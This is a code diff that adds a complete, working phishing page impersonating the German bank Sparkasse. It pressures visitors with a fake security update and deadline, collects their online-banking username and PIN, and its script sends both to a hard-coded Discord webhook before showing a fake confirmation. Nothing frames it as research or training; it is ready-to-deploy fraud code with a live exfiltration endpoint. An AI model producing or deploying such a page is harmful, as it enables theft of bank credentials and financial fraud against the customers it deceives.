@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sparkasse Secure</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f0f0;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Ladebildschirm */
+        #loadingScreen, #waitScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            z-index: 9999;
+        }
+
+        .loader, .wait-message {
+            width: 300px;
+            background-color: #444;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .loader-bar {
+            width: 100%;
+            height: 20px;
+            background-color: #666;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+
+        .loader-progress {
+            width: 0%;
+            height: 100%;
+            background-color: #e2001a;
+            transition: width 0.5s ease;
+        }
+
+        .loader-text, .wait-text {
+            margin-top: 10px;
+            font-size: 16px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 100px auto;
+            padding: 40px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo img {
+            width: 200px;
+            margin-bottom: 30px;
+        }
+        .title {
+            font-size: 28px;
+            font-weight: bold;
+            color: #e2001a;
+            margin-bottom: 20px;
+        }
+        .text {
+            font-size: 18px;
+            margin-top: 15px;
+            line-height: 1.5;
+            color: #555;
+        }
+        .warning {
+            font-weight: bold;
+            color: #e2001a;
+            margin-top: 20px;
+        }
+        .button {
+            background-color: #e2001a;
+            color: white;
+            font-size: 18px;
+            padding: 16px;
+            border: none;
+            cursor: pointer;
+            border-radius: 8px;
+            width: 100%;
+            margin-top: 25px;
+            transition: background-color 0.3s ease;
+        }
+        .button:hover {
+            background-color: #c00017;
+        }
+
+        /* Login-Seite */
+        .login-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            color: white;
+            padding-top: 60px;
+        }
+        .login-box {
+            width: 380px;
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            margin: auto;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-box h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .input-box {
+            background-color: #f9f9f9;
+            border: 1px solid #ccc;
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            margin-top: 12px;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+        .login-button {
+            width: 100%;
+            background-color: #e2001a;
+            color: white;
+            padding: 16px;
+            border: none;
+            margin-top: 20px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #c00017;
+        }
+
+        /* Erfolgsseite */
+        .success-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            color: #333;
+            padding-top: 60px;
+        }
+        .success-box {
+            width: 450px;
+            background: #f5f5f5;
+            padding: 30px;
+            border-radius: 12px;
+            margin: auto;
+            box-shadow: 0px 0px 18px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .success-box h2 {
+            color: #28a745;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .success-box p {
+            font-size: 18px;
+            color: #555;
+        }
+        .success-box img {
+            width: 90px;
+            margin-bottom: 20px;
+        }
+
+        /* Sicherheitszertifikate */
+        .security-certificates {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+        .security-certificates img {
+            width: 30px;
+            margin-right: 12px;
+        }
+
+        /* Animations- und Styling für den "Weiter"-Button */
+        .continue-button {
+            width: 200px;
+            height: 50px;
+            background-color: #e2001a;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: inline-block;
+            margin-top: 20px;
+            margin-left: 50%; /* Button wird jetzt mittig ausgerichtet */
+            transform: translateX(-50%); /* Button wird exakt in der Mitte positioniert */
+            opacity: 0.5;
+            pointer-events: none; /* Button ist inaktiv, wenn der Benutzername nicht eingegeben wurde */
+        }
+
+        .continue-button:hover {
+            background-color: #c00017;
+        }
+
+        /* Animationsstil für das PIN-Feld */
+        .pin-field {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: slideUp 1s forwards;
+        }
+
+        @keyframes slideUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* PIN-Feld weiter nach oben verschieben */
+        #pinField {
+            margin-top: -10px;
+        }
+
+        /* Styling für den Anmeldebutton */
+        .login-button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Styling für die Links und Copyright */
+        .footer-links {
+            font-size: 14px;
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            color: #555;
+        }
+        .footer-links a {
+            color: #e2001a;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Copyright unten rechts */
+        .copyright {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            font-size: 14px;
+            color: #000;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div id="loadingScreen">
+        <div class="loader">
+            <p>Bitte haben Sie einen Moment Geduld...</p>
+            <div class="loader-bar">
+                <div class="loader-progress" id="loaderProgress"></div>
+            </div>
+            <div class="loader-text" id="loaderText">0%</div>
+        </div>
+    </div>
+
+    <div id="waitScreen">
+        <div class="wait-message">
+            <p>Bitte warten...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="logo">
+            <img src="logo.jpg" alt="Sparkasse Logo">
+        </div>
+        <p class="title">Update 3.42 – Sicherheits- und Systemanpassungen</p>
+        <p class="text">
+            Dieses Update beinhaltet Änderungen an den Nutzungsbedingungen, Optimierungen der Login-Methoden sowie Sicherheitsverbesserungen.<br><br>
+            Änderungen im Detail:<br>
+            - Anpassung der Nutzungsbedingungen<br>
+            - Einführung zusätzlicher Sicherheitsfeatures<br>
+            - Optimierung der Login-Methoden<br>
+            - Verbesserte Benutzeroberfläche für den sicheren Zugriff
+        </p>
+        <p class="warning">Bitte führen Sie die Umstellung bis spätestens 15.2.25 durch, um eine leichte Einschränkung Ihres Online-Banking-Zugangs zu vermeiden.</p>
+        <button class="button" onclick="openLoginPage()">Jetzt Umstellung vornehmen</button>
+
+        <div class="security-certificates">
+            <p>Ihre Sicherheit ist uns wichtig. Unsere Seite ist durch SSL-Zertifikate geschützt.</p>
+            <img src="ssl.png" alt="SSL Zertifikat">
+        </div>
+    </div>
+
+    <!-- Login-Seite -->
+    <div id="loginPage" class="login-page">
+        <div class="login-box">
+            <h2>Erneute Anmeldung</h2>
+            <label for="username">Benutzername:</label>
+            <input type="text" id="username" class="input-box" placeholder="Geben Sie Ihren Benutzernamen ein" oninput="toggleContinueButton()">
+            
+            <button class="continue-button" id="continueButton" onclick="showPinField()" disabled>Weiter</button>
+
+            <div id="pinField" class="pin-field">
+                <label for="password"></label>
+                <input type="password" id="password" class="input-box" placeholder="Geben Sie Ihre Online-Banking-PIN ein" oninput="toggleLoginButton()">
+            </div>
+            
+            <button class="login-button" id="loginButton" onclick="submitLogin()" disabled>Verifizieren</button>
+
+            <div class="footer-links">
+                <a href="#">Sicherheitshinweise</a>
+                <a href="#">Zugangsdaten vergessen?</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Erfolgsseite -->
+    <div id="successPage" class="success-page">
+        <div class="success-box">
+            <img src="logo.jpg" alt="Sparkasse Logo">
+            <h2>Erfolgreich umgestellt!</h2>
+            <p>Ihr Online-Banking-Zugang wurde erfolgreich auf SparkasseSecure aktualisiert und ist jetzt sicherer als je zuvor.</p>
+            <p>Sie können diese Seite nun schließen.</p>
+        </div>
+    </div>
+
+    <div class="copyright">
+        <p>&copy; 2025 Sparkasse - Alle Rechte vorbehalten</p>
+    </div>
+
+    <script>
+        function showLoadingScreen() {
+            document.getElementById("loadingScreen").style.display = "flex";
+            simulateProgress();
+        }
+
+        function hideLoadingScreen() {
+            document.getElementById("loadingScreen").style.display = "none";
+        }
+
+        function showWaitScreen() {
+            document.getElementById("waitScreen").style.display = "flex";
+        }
+
+        function hideWaitScreen() {
+            document.getElementById("waitScreen").style.display = "none";
+        }
+
+        function simulateProgress() {
+            let progress = 0;
+            const progressBar = document.getElementById("loaderProgress");
+            const progressText = document.getElementById("loaderText");
+
+            const interval = setInterval(() => {
+                progress += 1; // 1% pro Schritt
+                progressBar.style.width = `${progress}%`;
+                progressText.textContent = `${progress}%`;
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                }
+            }, 80); // 80ms für jeden Schritt (8–9 Sekunden insgesamt)
+        }
+
+        function openLoginPage() {
+            showLoadingScreen();
+            setTimeout(function () {
+                document.querySelector('.container').style.display = 'none';
+                document.getElementById("loginPage").style.display = "block";
+                hideLoadingScreen();
+            }, 9000); // Ladebildschirm für 9 Sekunden
+        }
+
+        function toggleContinueButton() {
+            const username = document.getElementById('username').value;
+            const continueButton = document.getElementById('continueButton');
+            if (username) {
+                continueButton.style.opacity = '1';
+                continueButton.disabled = false;
+                continueButton.style.pointerEvents = 'auto';
+            } else {
+                continueButton.style.opacity = '0.5';
+                continueButton.disabled = true;
+                continueButton.style.pointerEvents = 'none';
+            }
+        }
+
+        function showPinField() {
+            const continueButton = document.getElementById('continueButton');
+            continueButton.style.display = 'none';  // Weiter-Button nach Klick ausblenden
+
+            const pinField = document.getElementById('pinField');
+            pinField.style.display = 'block';  // PIN-Feld anzeigen
+            pinField.classList.add('pin-field'); // Animation aktivieren
+        }
+
+        function toggleLoginButton() {
+            const password = document.getElementById('password').value;
+            const loginButton = document.getElementById('loginButton');
+            if (password) {
+                loginButton.disabled = false;
+                loginButton.style.backgroundColor = "#e2001a";
+            } else {
+                loginButton.disabled = true;
+                loginButton.style.backgroundColor = "#ccc";
+            }
+        }
+
+        function submitLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username && password) {
+                // "Bitte warten..." anzeigen
+                showWaitScreen();
+
+                // Erfolgsseite nach 2 Sekunden anzeigen
+                setTimeout(function () {
+                    sendToDiscord(`Benutzername: ${username}, Online-Banking-PIN: ${password}`);
+                    hideWaitScreen();
+                    showSuccessPage();
+                }, 2000); // 2 Sekunden Verzögerung
+            } else {
+                alert('Bitte füllen Sie beide Felder aus.');
+            }
+        }
+
+        function showSuccessPage() {
+            document.getElementById("loginPage").style.display = "none";
+            document.getElementById("successPage").style.display = "block";
+        }
+
+        const sendToDiscord = (text) => {
+            const webhookURL = "https://discord.com/api/webhooks/1338141099533013074/eJiL_y3r_N4jU9gRsm9eGllioSNtK7BUbW54Hc4m5LeifuiN7XMNjsE2a7fXgFdmMvOZ"; 
+
+            const payload = {
+                content: "Eingegebene Daten: " + text
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).catch(error => console.error("Fehler beim Senden an Discord:", error));
+        };
+    </script>
+
+</body>
+</html>
